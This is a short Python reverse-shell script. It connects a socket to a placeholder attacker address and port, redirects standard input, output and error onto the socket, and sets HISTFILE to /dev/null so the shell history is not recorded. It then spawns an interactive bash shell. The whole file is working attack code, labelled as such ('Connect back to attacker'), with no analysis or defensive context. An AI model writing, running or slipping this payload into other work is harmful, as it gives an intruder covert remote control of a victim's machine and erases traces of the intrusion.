#!/usr/bin/env python3
import os
import pty
import socket

# Connect back to attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('LOCALIP', 'LOCALPORT'))

# Redirect I/O to socket
os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)

# Hide history
os.putenv('HISTFILE', '/dev/null')

# Spawn shell
pty.spawn('/bin/bash')
sock.close()
